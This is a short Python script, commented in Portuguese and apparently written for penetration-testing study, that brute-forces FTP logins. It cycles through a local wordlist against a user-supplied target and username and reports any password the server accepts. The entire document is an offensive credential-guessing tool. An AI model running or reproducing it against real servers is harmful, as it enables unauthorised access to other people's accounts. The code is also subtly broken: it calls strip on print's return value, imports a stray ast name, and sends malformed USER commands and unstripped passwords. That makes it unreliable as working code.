# brute_force_ftp.py
# Data: 18/08/2022
# Criador: Reinaldo Garcia
# Descrição: Script para fazer Brute Force no serviço de FTP

from ast import Bytes
import socket,sys,re

if len(sys.argv) != 3:
    print("Modo de uso: python kingftp.py 127.0.0.1 usuario")
    sys.exit()

target = sys.argv[1]
usuario = sys.argv[2]

f = open('C:\\Users\\User\\Documents\\MEGA\\OSCP\\DCPT\\Força_Bruta\\wordlist.txt.txt')
for palavra in f.readlines():
    print(f"Realizando o brute force FTP: {usuario}:{palavra}").strip()
    
    # Criando o socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,21))
    s.recv(1024)

    encoded = Bytes(usuario.encode())
    mensagem_usuario = f"USER ftp.{target}|{usuario}\r\n".encode()
    s.send(mensagem_usuario)
    s.recv(1024)
    mensagem_senha = f"PASS {palavra}\r\n".encode()
    s.send(mensagem_senha)
    resposta = s.recv(1024).decode()
    mensagem_saida = f"QUIT\r\n".encode()
    s.send(mensagem_saida)

    if re.search('230', resposta):
        print(f"Senha encontrada --> {palavra}")
        break
